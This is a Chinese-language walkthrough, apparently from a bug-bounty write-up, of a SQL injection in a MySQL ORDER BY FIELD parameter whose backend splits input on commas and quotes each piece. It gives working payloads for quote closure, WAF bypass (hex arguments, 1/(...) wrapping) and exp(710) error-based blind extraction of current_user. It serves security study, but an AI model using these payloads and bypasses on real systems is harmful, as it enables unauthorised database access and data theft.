某次奇怪的sql注入记录

发现注入
====

某个功能点的抓包测试，对其中参数进行测试

单/双数个引号正常规律返回，注入存在，同时返回报错信息

先看一个单引号的报错

```php
keyValue=29'
```

![image-20230720114544602](https://shs3.b.qianxin.com/butian_public/f862999700e1d99b9230374559a3a4648eb72e5e60f65.jpg)

key值被俩单引号包起来了

构造

```mysql
keyValue=29'='29
```

正常执行

![image-20230719183602312](https://shs3.b.qianxin.com/butian_public/f957114c83cb84fcec3653f0c715970bee3f3905dc867.jpg)

常规手法尝试注出库名,（先构造逻辑运算，在构造报错，再在报错语句中执行查询）

```mysql
keyValue=29'=if(1 like 1 ,1,1)='29
```

，发现有某waf

![image-20230720174007064](https://shs3.b.qianxin.com/butian_public/f47382970666593c30ac6273c0ee3209f6d74d6211ca7.jpg)

利用该waf特性，将if函数的参数类型稍作修改即可绕过，例如十六进制字符

```mysql
keyValue=29'=if(1 like 1 ,1,0x11)='29
```

![image-20230720174828060](https://shs3.b.qianxin.com/butian_public/f1227308c43d74f0ea0cc2c59dc81032f7a15a5f66c05.jpg)

观察报错，发现执行的语句我们传入的payload莫名奇妙多了几个单引号，导致语句始终无法正常闭合

看sql语句是此处的传参是在 order by field后面，尝试了解下order by field看能不能有所突破

order by field
==============

order by field 是mysql中基于order by拓展的一种语法，用于更加定制化的排序

只使用order by的话，只能对指定列的值按照正序/逆序进行排序

例如对以下数据按照id进行排序，返回的结果要么是id的值从1-10顺序排列，要么是使用order by desc使结果为id的值从10-1逆序排列

![image-20230719115858869](https://shs3.b.qianxin.com/butian_public/f591045a31a1a2e4af862536e071894d7497fd83d1f5b.jpg)

有没有一种办法使返回结果按照给定的id序列排序呢，例如返回结果序列对应id的序列为1，3，5，7，9，2，4，6，8，10这种

order by fieid就可以解决如下需求

![image-20230719120553247](https://shs3.b.qianxin.com/butian_public/f791607d2ed013ae1432b684767ce01b2106cada68000.jpg)

order by field的排序原理为将指定的列值对应的数据逐一与源数据表中数据进行比较，匹配到的值会置于源数据表的最后一行，依次进行

没有匹配到的数据会按照原始顺序处于表中的顶部

![image-20230719121420075](https://shs3.b.qianxin.com/butian_public/f77117558c2100c014e5d898ebbb112ba2585d85cb238.jpg)

值得注意的是，当order by field指定排序的列的值为字符串类型时，必须用引号括起来，否则会报错（mysql中int类型的数字与char类型的数字是可以相等的，这种情况除外）

![image-20230719150601084](https://shs3.b.qianxin.com/butian_public/f4798679fe116a6d84c96da357d5ee363b4163f30fc47.jpg)

![image-20230719150849419](https://shs3.b.qianxin.com/butian_public/f2476276ae1b5406d4f59813f18de9ed2d0197dd7b6f2.jpg)

知道了这个特性，就不难猜出之前的注入会什么执行时会多了几个单引号了，应该就是开发设计后端在接受前端传过来的order by field的参数并拼接到sql语句中时，对所有传入的参数先以逗号为分隔符分组，再将分组的数据各自用单引号括起来在拼接到sql语句中执行。

比如当我们传入keyValue=29'=if(1 like 1 ,1,0x11)='29时，后端对传入的字符串以逗号进行截取，获得三个字符串如下

```php
29'=if(1 like 1
1
0x11)='29
```

再将三个字符串各自用引号括起来作为order by field的参数

所以当传入keyValue为29'=if(1 like 1 ,1,0x11)='29，数据库中执行的是

```mysql
SELECT * FROM xxx WHERE xxx  ORDER BY FIELD (`id`, '29'=if(1 like 1 ','1','0x11)='29') LIMIT 0,999999
```

![image-20230720175014002](https://shs3.b.qianxin.com/butian_public/f53421705b589141bc051aed454be7f35e16e01bf5047.jpg)

搞清楚了语句的逻辑后，接下来开始构造闭合语句

注出库名
====

将29'=if(1 like 1 ,1,0x11)='29改成==》29'=if('1' like '1 ,1,0x11')='29

![image-20230720175535558](https://shs3.b.qianxin.com/butian_public/f940561b87b5c03dcf57beb01a06cad0e7ebc04b28b1d.jpg)

构造报错

```mysql
keyValue=29'=if(exp(111) like '1 ,1,0x11')='29
```

![image-20230720175801329](https://shs3.b.qianxin.com/butian_public/f11705343828c2143bcf7e8172e6816b0766f456bc8a2.jpg)

```mysql
keyValue=29'=if(exp(710) like '1 ,1,0x11')='29
```

![image-20230720175848611](https://shs3.b.qianxin.com/butian_public/f9889085a6a4a48d082ca99b565ae9a7aa4a14b3a62de.jpg)

返回不一样，可以使用报错盲注

开始尝试爆user

```mysql
keyValue=29'=if(exp(if(current_user like '1,710,1')) like '1 ,1,0x11')='29
```

waf阻断

![image-20230720183442632](https://shs3.b.qianxin.com/butian_public/f856911a977a2565d03261029094b5488985cb88cf04d.jpg)

老样子，将if函数的的参数值修改一下绕过该waf

if(current\_user like 1,710,1)==》if(current\_user like 1,710,0x11)

![image-20230720180217184](https://shs3.b.qianxin.com/butian_public/f5981775e330ac03f2d9d7fafed9e1ca3721bce6e4750.jpg)

居然不行，应该是触发了别的拦截策略，将current\_user改成current\_use又可以了，一开始以为是检测了current\_user这个字符串,后来发现并不是，将if函数的参数再fuzz修改一下，绕过成功

if(current\_user like 1,710,0x11)==》if(1/(current\_user like 1),710,0x11)

```mysql
keyValue=29'=if(exp(if(1/(current_user like '1),710,0x11')) like '1 ,1,0x11')='29
```

![image-20230720184246305](https://shs3.b.qianxin.com/butian_public/f596060d096e424cbf1fdeef767d87a09dc1ae2059127.jpg)

但是此时，语句又出了问题，最里面的if语句的右括号被两个引号包裹了，导致语句异常

此时，需要在这个右括号的后面再构造一个布尔运算，使这个右括号逃出引号的包裹

即

原先经过后端处理的第一个取值为

```mysql
29'=if(exp(if(1/(current_user like '1)
```

最终执行为

```MYSQL
SELECT * FROM xxx WHERE xxx  ORDER BY FIELD(`id`, '29'=if(exp(if(1/(current_user like '1)','710','0x11')) like '1 ','1','0x11')='29') LIMIT 0,999999
```

修改为如下后

```mysql
keyValue=29'=if(exp(if(1/(current_user like '1')='1,710,0x11')) like '1 ,1,0x11')='29
```

经过后端处理原先的第一个取值为

```mysql
29'=if(exp(if(1/(current_user like '1')='1
```

最终执行为

```mysql
SELECT * FROM xxx WHERE xxx  ORDER BY FIELD(`id`, '29'=if(exp(if(1/(current_user like '1')='1','710','0x11')) like '1 ','1','0x11')='29'') LIMIT 0,999999
```

![image-20230720184657249](https://shs3.b.qianxin.com/butian_public/f2510766b3a6355f3f1ce14e51c0d4c73a194e11e8c3c.jpg)

一位一位直接跑出user

```php
keyValue=29'=if(exp(if(1/(current_user like 'root%')='1,710,0x11')) like '1 ,1,0x11')='29
```

![image-20230720184729945](https://shs3.b.qianxin.com/butian_public/f952049d85889f25d95677ae24475327c87ebb7bd3cbd.jpg)